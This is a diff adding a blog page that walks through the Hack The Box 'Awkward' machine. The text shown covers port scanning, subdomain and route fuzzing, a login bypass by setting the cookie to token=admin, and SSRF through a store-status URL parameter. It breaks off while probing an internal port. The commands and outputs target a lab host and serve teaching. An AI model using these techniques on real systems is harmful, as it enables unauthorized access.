@@ -1,0 +1,859 @@
+<!doctype html><html lang="es"><head><title>Awkward | 7Rocky</title><meta charset="utf-8"><meta http-equiv="x-ua-compatible" content="IE=edge,chrome=1"><meta name="viewport" content="width=device-width,minimum-scale=1"><meta name="description" content="Hack The Box. Linux. Medium machine. This machine has a website built in Vue.js that exposes a login form which can be easily bypassed. Then we find an API endpoint that tests connectivity of other websites, which can be exploited using Server-Side Request Forgery to find an internal API documentation. There we have some Node.js code to analyze and see how we can bypass some checks to obtain all the users information and crack a password hash. After that, we can log in, get a valid JWT token and crack it to find the secret. Therefore, we can forge any JWT token, which means we can inject any payload as token information. Using this power, we can read arbitrary files from the server exploiting awk and find plaintext credentials inside a compressed archive. Next, we can access via SSH and find out another website built with PHP with two vulnerabilities. There is also a Cron task that takes information from a CSV file to send an email. The key here is to inject a malicious parameter in the CSV file so that the mail command executes a malicious script, which leads to the privilege escalation"><meta itemprop="description" content="Hack The Box. Linux. Medium machine. This machine has a website built in Vue.js that exposes a login form which can be easily bypassed. Then we find an API endpoint that tests connectivity of other websites, which can be exploited using Server-Side Request Forgery to find an internal API documentation. There we have some Node.js code to analyze and see how we can bypass some checks to obtain all the users information and crack a password hash. After that, we can log in, get a valid JWT token and crack it to find the secret. Therefore, we can forge any JWT token, which means we can inject any payload as token information. Using this power, we can read arbitrary files from the server exploiting awk and find plaintext credentials inside a compressed archive. Next, we can access via SSH and find out another website built with PHP with two vulnerabilities. There is also a Cron task that takes information from a CSV file to send an email. The key here is to inject a malicious parameter in the CSV file so that the mail command executes a malicious script, which leads to the privilege escalation"><meta name="twitter:card" content="Hack The Box. Linux. Medium machine. This machine has a website built in Vue.js that exposes a login form which can be easily bypassed. Then we find an API endpoint that tests connectivity of other websites, which can be exploited using Server-Side Request Forgery to find an internal API documentation. There we have some Node.js code to analyze and see how we can bypass some checks to obtain all the users information and crack a password hash. After that, we can log in, get a valid JWT token and crack it to find the secret. Therefore, we can forge any JWT token, which means we can inject any payload as token information. Using this power, we can read arbitrary files from the server exploiting awk and find plaintext credentials inside a compressed archive. Next, we can access via SSH and find out another website built with PHP with two vulnerabilities. There is also a Cron task that takes information from a CSV file to send an email. The key here is to inject a malicious parameter in the CSV file so that the mail command executes a malicious script, which leads to the privilege escalation"><meta name="twitter:description" content="Hack The Box. Linux. Medium machine. This machine has a website built in Vue.js that exposes a login form which can be easily bypassed. Then we find an API endpoint that tests connectivity of other websites, which can be exploited using Server-Side Request Forgery to find an internal API documentation. There we have some Node.js code to analyze and see how we can bypass some checks to obtain all the users information and crack a password hash. After that, we can log in, get a valid JWT token and crack it to find the secret. Therefore, we can forge any JWT token, which means we can inject any payload as token information. Using this power, we can read arbitrary files from the server exploiting awk and find plaintext credentials inside a compressed archive. Next, we can access via SSH and find out another website built with PHP with two vulnerabilities. There is also a Cron task that takes information from a CSV file to send an email. The key here is to inject a malicious parameter in the CSV file so that the mail command executes a malicious script, which leads to the privilege escalation"><meta property="og:description" content="Hack The Box. Linux. Medium machine. This machine has a website built in Vue.js that exposes a login form which can be easily bypassed. Then we find an API endpoint that tests connectivity of other websites, which can be exploited using Server-Side Request Forgery to find an internal API documentation. There we have some Node.js code to analyze and see how we can bypass some checks to obtain all the users information and crack a password hash. After that, we can log in, get a valid JWT token and crack it to find the secret. Therefore, we can forge any JWT token, which means we can inject any payload as token information. Using this power, we can read arbitrary files from the server exploiting awk and find plaintext credentials inside a compressed archive. Next, we can access via SSH and find out another website built with PHP with two vulnerabilities. There is also a Cron task that takes information from a CSV file to send an email. The key here is to inject a malicious parameter in the CSV file so that the mail command executes a malicious script, which leads to the privilege escalation"><meta property="og:type" content="article"><meta name="robots" content="index, follow"><meta name="author" content="7Rocky's Blog. Cybersecurity and Maths"><meta name="twitter:author" content="7Rocky's Blog. Cybersecurity and Maths"><meta property="og:author" content="7Rocky's Blog. Cybersecurity and Maths"><meta name="image" content="https://7rocky.github.io/images/HTB/Awkward/Awkward.png"><meta name="twitter:image" content="https://7rocky.github.io/images/HTB/Awkward/Awkward.png"><meta property="og:image" content="https://7rocky.github.io/images/HTB/Awkward/Awkward.png"><meta property="og:site_name" content="7Rocky's Blog. Cybersecurity and Maths"><meta itemprop="name" content="Awkward"><meta property="twitter:title" content="Awkward"><meta property="og:title" content="Awkward"><meta property="og:url" content="https://7rocky.github.io/en/htb/awkward/"><meta itemprop="keywords" content="api,nginx,vue,cronjob,lfr,password-reuse,file-permissions,jwt,command-injection,static-code-analysis,rce,directory-path-traversal,hash-cracking,ssrf,"><script async src="https://www.googletagmanager.com/gtag/js?id=G-Z1HQGH3M4D"></script>
+<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-Z1HQGH3M4D",{anonymize_ip:!1})}</script><link rel="shortcut icon" href="/favicon.ico" type="image/x-icon"><link href="/css/style.css" rel="stylesheet"><link href="/css/main.css" rel="stylesheet"><link href="/css/code.css" rel="stylesheet"><script src="/js/htb.js"></script></head><body class="ma0 production"><header style="position:sticky;top:0;z-index:9"><div class="bg-black"><nav class="ph4-ns" id="navigation" role="navigation"><div class="flex-l justify-between items-center center"><a class="f3 fw2 hover-white no-underline white-90 dib" href="/en/" title="7Rocky">7Rocky</a><div class="flex-l items-center"><a href="/en/search" target class="link-transition link dib z-999 pt3 pt0-l mr1 search-link" title="Search" rel="noopener" aria-label="Search"><svg height="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 487.95 487.95" style="enable-background:new 0 0 487.95 487.95"><g><g><path d="M481.8 453l-140-140.1c27.6-33.1 44.2-75.4 44.2-121.6C386 85.9 299.5.2 193.1.2S0 86 0 191.4s86.5 191.1 192.9 191.1c45.2.0 86.8-15.5 119.8-41.4l140.5 140.5c8.2 8.2 20.4 8.2 28.6.0C490 473.4 490 461.2 481.8 453zM41 191.4c0-82.8 68.2-150.1 151.9-150.1s151.9 67.3 151.9 150.1-68.2 150.1-151.9 150.1S41 274.1 41 191.4z" style="fill-rule:evenodd;clip-rule:evenodd;fill:#a9a9b3"/></g></g><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/></svg></a><a class="link-transition lang link dib z-999 pt3 pt0-l mr3" href="/htb/awkward/" title="es"><img alt="es" height="30px" src="/images/es.png" style="border:4px solid#000;border-radius:100%" width="30px"></a>
+<a class="link-transition lang link dib z-999 pt3 pt0-l" href="#" title="en"><img alt="en" height="30px" src="/images/en.png" width="30px"></a><ul class="pl0 ml3 mr3" style="line-height:30px"><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/en/ctf/" title="CTF">CTF</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/en/htb/" title="HTB">HTB</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/en/imc/" title="IMC">IMC</a></li></ul><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn——Opens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub——Opens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></nav></div></header><main class="pb5" role="main" style="min-height:720px"><article class="flex-l flex-wrap justify-between mw8 center ph3"><header class="mt4 w-80-l"><a aria-label="aside" class="instapaper_ignoref b tracked" href="../" style="font-size:1.2rem">&lt;- HTB</a><div id="sharing" class="mt3"><a aria-label="share on Facebook" class="facebook no-underline" href="https://www.facebook.com/sharer.php?u=https://7rocky.github.io/en/htb/awkward/" title="share on Facebook"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M28.765 50.32h6.744V33.998h4.499l.596-5.624h-5.095l.007-2.816c0-1.466.14-2.253 2.244-2.253h2.812V17.68h-4.5c-5.405.0-7.307 2.729-7.307 7.317v3.377h-3.369v5.625h3.369V50.32zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd"/></svg></a><a aria-label="share on Twitter" class="twitter no-underline" href="https://twitter.com/share?url=https://7rocky.github.io/en/htb/awkward/&text=Awkward" title="share on Twitter"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M37.167 22.283c-2.619.953-4.274 3.411-4.086 6.101l.063 1.038-1.048-.127c-3.813-.487-7.145-2.139-9.974-4.915l-1.383-1.377-.356 1.017c-.754 2.267-.272 4.661 1.299 6.271.838.89.649 1.017-.796.487-.503-.169-.943-.296-.985-.233-.146.149.356 2.076.754 2.839.545 1.06 1.655 2.097 2.871 2.712l1.027.487-1.215.021c-1.173.0-1.215.021-1.089.467.419 1.377 2.074 2.839 3.918 3.475l1.299.444-1.131.678c-1.676.976-3.646 1.526-5.616 1.568C19.775 43.256 19 43.341 19 43.405c0 .211 2.557 1.397 4.044 1.864 4.463 1.377 9.765.783 13.746-1.568 2.829-1.673 5.657-5 6.978-8.221.713-1.716 1.425-4.851 1.425-6.354.0-.975.063-1.102 1.236-2.267.692-.678 1.341-1.419 1.467-1.631.21-.403.188-.403-.88-.043-1.781.636-2.033.551-1.152-.402.649-.678 1.425-1.907 1.425-2.267.0-.063-.314.042-.671.233-.377.212-1.215.53-1.844.72l-1.131.361-1.027-.7c-.566-.381-1.361-.805-1.781-.932C39.766 21.902 38.131 21.944 37.167 22.283zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a><a aria-label="share on LinkedIn" class="linkedin no-underline" href="https://www.linkedin.com/shareArticle?mini=true&url=https://7rocky.github.io/en/htb/awkward/&title=Awkward" title="share on LinkedIn"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a></div><h1 class="f1 mt3 mb1">Awkward</h1><time class="mt4 f6 dib tracked" datetime="2023-02-25T00:00:00+01:00">25 / 02 / 2023</time><br><p class="mb4 f6 dib tracked">22 minutes to read</p></header><div class="htb-image"><img alt="Awkward" src="/images/HTB/Awkward/Awkward.png"></div><ul class="nested-links tags"><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/api" title="API">API</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/nginx" title="nginx">nginx</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/vue" title="Vue.js">Vue.js</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/cronjob" title="Cron jobs">Cron jobs</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/lfr" title="Local File Read">Local File Read</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/password-reuse" title="Password reuse">Password reuse</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/file-permissions" title="File permissions">File permissions</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/jwt" title="JSON Web Token">JSON Web Token</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/command-injection" title="Command Injection">Command Injection</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/static-code-analysis" title="Static Code Analysis">Static Code Analysis</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/rce" title="Remote Code Execution">Remote Code Execution</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/directory-path-traversal" title="Directory Path Traversal">Directory Path Traversal</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/hash-cracking" title="Password hash cracking">Password hash cracking</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/ssrf" title="Server-Side Request Forgery">Server-Side Request Forgery</a></li></ul><aside aria-label="aside" class="w-20-l mt6-l aside-mobile"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contents</p><nav id="TableOfContents"><ul><li><a href="#port-scanning">Port scanning</a></li><li><a href="#enumeration">Enumeration</a><ul><li><a href="#authentication-bypass">Authentication bypass</a></li><li><a href="#exploiting-ssrf">Exploiting SSRF</a></li><li><a href="#static-code-analysis">Static code analysis</a></li></ul></li><li><a href="#foothold">Foothold</a><ul><li><a href="#finding-a-lfr-vulnerability">Finding a LFR vulnerability</a></li><li><a href="#finding-a-plaintext-password">Finding a plaintext password</a></li></ul></li><li><a href="#system-enumeration">System enumeration</a><ul><li><a href="#enumerating-the-store-application">Enumerating the store application</a></li></ul></li><li><a href="#privilege-escalation">Privilege escalation</a></li><li><a href="#alternative-path">Alternative path</a></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0" title="Buy me a beer">🍺 <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside><div class="nested-copy-line-height lh-copy serif f4 nested-links nested-img pr4-l w-80-l"><ul><li><strong>OS</strong>: Linux</li><li><strong>Difficulty</strong>: Medium</li><li><strong>IP Address</strong>: 10.10.11.185</li><li><strong>Release</strong>: 22 / 10 / 2022</li></ul><h2 id="port-scanning">Port scanning</h2><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"># Nmap 7.93 scan initiated as: nmap -sC -sV -o nmap/targeted 10.10.11.185 -p 22,80
+Nmap scan report for 10.10.11.185
+Host is up (0.050s latency).
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   256 7254afbaf6e2835941b7cd611c2f418b (ECDSA)
+|_  256 59365bba3c7821e326b37d23605aec38 (ED25519)
+80/tcp open  http    nginx 1.18.0 (Ubuntu)
+|_http-title: Site doesn't have a title (text/html).
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
+# Nmap done -- 1 IP address (1 host up) scanned in 8.16 seconds
+</code></pre></div><p>This machine has ports 22 (SSH) and 80 (HTTP) open.</p><h2 id="enumeration">Enumeration</h2><p>If we go to <code>http://10.10.11.185</code>, we will be redirected to <code>http://hat-valley.htb</code>. After setting the domain in <code>/etc/hosts</code>, we have this landing page:</p><p><img src="/images/HTB/Awkward/Awkward-1.png" alt="Awkward 1"></p><p>Since there&rsquo;s a domain, let&rsquo;s enumerate possible subdomains:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">ffuf</span> -w $WORDLISTS/dirbuster/directory-list-lowercase-2.3-medium.txt -u http://hat-valley.htb -H <span class="code-dark-yellow">'Host: FUZZ.hat-valley.htb'</span> -fs 132  
+
+<span class="code-dark-yellow">[Status: 401, Size: 188, Words: 6, Lines: 8, Duration: 67ms]</span>
+    * FUZZ: store
+</code></pre></div><p>Alright, now we have <code>store.hat-valley.htb</code>, but it asks for HTTP Basic Authentication:</p><p><img src="/images/HTB/Awkward/Awkward-2.png" alt="Awkward 2"></p><p>Let&rsquo;s fuzz for more routes on both websites:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">ffuf</span> -w $WORDLISTS/SecLists/Discovery/Web-Content/raft-small-words.txt -u http://hat-valley.htb/FUZZ -r
+
+<span class="code-dark-green">[Status: 200, Size: 16353, Words: 1760, Lines: 375, Duration: 152ms]</span>
+    * FUZZ: css
+
+<span class="code-dark-green">[Status: 200, Size: 14351, Words: 1661, Lines: 366, Duration: 150ms]</span>
+    * FUZZ: js
+
+<span class="code-dark-green">[Status: 200, Size: 10998, Words: 1572, Lines: 356, Duration: 84ms]</span>
+    * FUZZ: static
+
+<span class="code-dark-green">[Status: 200, Size: 2881, Words: 305, Lines: 55, Duration: 54ms]</span>
+    * FUZZ: .
+
+<span class="code-cyan">$</span> <span class="code-dark-green">ffuf</span> -w $WORDLISTS/SecLists/Discovery/Web-Content/raft-small-words.txt -u http://store.hat-valley.htb/FUZZ -fc 401  
+
+<span class="code-dark-blue">[Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 52ms]</span>
+    * FUZZ: css
+
+<span class="code-dark-blue">[Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 57ms]</span>
+    * FUZZ: js
+
+<span class="code-dark-blue">[Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 46ms]</span>
+    * FUZZ: img
+
+<span class="code-dark-blue">[Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 45ms]</span>
+    * FUZZ: cart
+
+<span class="code-dark-blue">[Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 42ms]</span>
+    * FUZZ: static
+
+<span class="code-dark-blue">[Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 51ms]</span>
+    * FUZZ: fonts
+
+<span class="code-dark-blue">[Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 47ms]</span>
+    * FUZZ: product-details
+</code></pre></div><p>Well, nothing too interesting for the moment.</p><p>If we inspect the main website, it is build with Vue.js. This kind of websites are generated with JavaScript (Single Page Applications), so there are routes that can be found looking into the JavaScript files:</p><p><img src="/images/HTB/Awkward/Awkward-3.png" alt="Awkward 3"></p><p>Let&rsquo;s go to <code>/hr</code> (<code>/dashboard</code> redirects to <code>/hr</code> as well):</p><p><img src="/images/HTB/Awkward/Awkward-4.png" alt="Awkward 4"></p><h3 id="authentication-bypass">Authentication bypass</h3><p>We can try some default credentials or injections (SQL and NoSQL), but none of them work. At least, we can cause errors on the server and see some paths and filenames (<code>/var/www/hat-valley.htb/server/server.js</code>):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> hat-valley.htb/api/login -H <span class="code-dark-yellow">'Content-Type: application/json'</span> -d <span class="code-dark-yellow">'{'</span>
+&lt;!DOCTYPE html&gt;
+&lt;html lang="en"&gt;
+&lt;head&gt;
+&lt;meta charset="utf-8"&gt;
+&lt;title&gt;Error&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;pre&gt;SyntaxError: Unexpected end of JSON input&lt;br&gt;    at JSON.parse (&lt;anonymous&gt;)&lt;br&gt;    at parse (/var/www/hat-valley.htb/node_modules/body-parser/lib/types/json.js:89:19)&lt;br&gt;    at /var/www/hat-valley.htb/node_modules/body-parser/lib/read.js:128:18&lt;br&gt;    at AsyncResource.runInAsyncScope (async_hooks.js:190:9)&lt;br&gt;    at invokeCallback (/var/www/hat-valley.htb/node_modules/raw-body/index.js:231:16)&lt;br&gt;    at done (/var/www/hat-valley.htb/node_modules/raw-body/index.js:220:7)&lt;br&gt;    at IncomingMessage.onEnd (/var/www/hat-valley.htb/node_modules/raw-body/index.js:280:7)&lt;br&gt;    at IncomingMessage.emit (events.js:314:20)&lt;br&gt;    at endReadableNT (_stream_readable.js:1241:12)&lt;br&gt;    at processTicksAndRejections (internal/process/task_queues.js:84:21)&lt;/pre&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+
+<span class="code-cyan">$</span> <span class="code-dark-green">curl</span> hat-valley.htb/api/login -H <span class="code-dark-yellow">'Content-Type: application/json'</span> -d <span class="code-dark-yellow">'{"username":"asdf"}'</span>
+&lt;!DOCTYPE html&gt;
+&lt;html lang="en"&gt;
+&lt;head&gt;
+&lt;meta charset="utf-8"&gt;
+&lt;title&gt;Error&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;pre&gt;TypeError [ERR_INVALID_ARG_TYPE]: The first argument must be of type string or an instance of Buffer, ArrayBuffer, or Array or an Array-like Object. Received undefined&lt;br&gt;    at Function.from (buffer.js:330:9)&lt;br&gt;    at new Buffer (buffer.js:286:17)&lt;br&gt;    at module.exports (/var/www/hat-valley.htb/node_modules/sha256/lib/nodecrypto.js:14:12)&lt;br&gt;    at /var/www/hat-valley.htb/server/server.js:30:76&lt;br&gt;    at Layer.handle [as handle_request] (/var/www/hat-valley.htb/node_modules/express/lib/router/layer.js:95:5)&lt;br&gt;    at next (/var/www/hat-valley.htb/node_modules/express/lib/router/route.js:144:13)&lt;br&gt;    at Route.dispatch (/var/www/hat-valley.htb/node_modules/express/lib/router/route.js:114:3)&lt;br&gt;    at Layer.handle [as handle_request] (/var/www/hat-valley.htb/node_modules/express/lib/router/layer.js:95:5)&lt;br&gt;    at /var/www/hat-valley.htb/node_modules/express/lib/router/index.js:284:15&lt;br&gt;    at Function.process_params (/var/www/hat-valley.htb/node_modules/express/lib/router/index.js:346:12)&lt;/pre&gt;  
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre></div><p>Taking a look again at the login form, we see that we have a cookie called <code>token</code> with value <code>guest</code>:</p><p><img src="/images/HTB/Awkward/Awkward-5.png" alt="Awkward 5"></p><p>Let&rsquo;s change <code>guest</code> to <code>admin</code>:</p><p><img src="/images/HTB/Awkward/Awkward-6.png" alt="Awkward 6"></p><p>Totally unexpected&mldr; Now we have access to the <code>/dashboard</code>.</p><p>When clicking on &ldquo;Refresh&rdquo; an HTTP request is made:</p><p><img src="/images/HTB/Awkward/Awkward-7.png" alt="Awkward 7"></p><h3 id="exploiting-ssrf">Exploiting SSRF</h3><p>Let&rsquo;s see if the server can connect to us:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> <span class="code-dark-yellow">'hat-valley.htb/api/store-status?url="http://10.10.17.44"'</span> -H <span class="code-dark-yellow">'Cookie: token=admin'</span>
+&lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd"&gt;  
+&lt;html&gt;
+&lt;head&gt;
+&lt;meta http-equiv="Content-Type" content="text/html; charset=utf-8"&gt;
+&lt;title&gt;Directory listing for /&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;h1&gt;Directory listing for /&lt;/h1&gt;
+&lt;hr&gt;
+&lt;ul&gt;
+&lt;/ul&gt;
+&lt;hr&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> -m http.server 80
+Serving HTTP on :: port 80 (http://[::]:80/) ...
+::ffff:10.10.11.185 - - [12/Feb/2023 21:20:37] "GET / HTTP/1.1" 200 -  
+</code></pre></div><p>It does. Let&rsquo;s use <code>nc</code> to see the full HTTP request:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">nc</span> -nlvp 80
+Ncat: Version 7.93 ( https://nmap.org/ncat )  
+Ncat: Listening on :::80
+Ncat: Listening on 0.0.0.0:80
+Ncat: Connection from 10.10.11.185.
+Ncat: Connection from 10.10.11.185:48926.
+GET / HTTP/1.1
+Accept: application/json, text/plain, */*
+User-Agent: axios/0.27.2
+Host: 10.10.17.44
+Connection: close
+</code></pre></div><p>It is using <code>axios</code> to perform the HTTP request. Now, we can try to use Server-Side Request Forgery (SSRF) to query internal ports. For example, we can see port 80:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> <span class="code-dark-yellow">'hat-valley.htb/api/store-status?url="http://127.0.0.1:80"'</span> -H <span class="code-dark-yellow">'Cookie: token=admin'</span>  
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+&lt;meta http-equiv="Refresh" content="0; url='http://hat-valley.htb'" /&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;/body&gt;
+&lt;/html&gt;
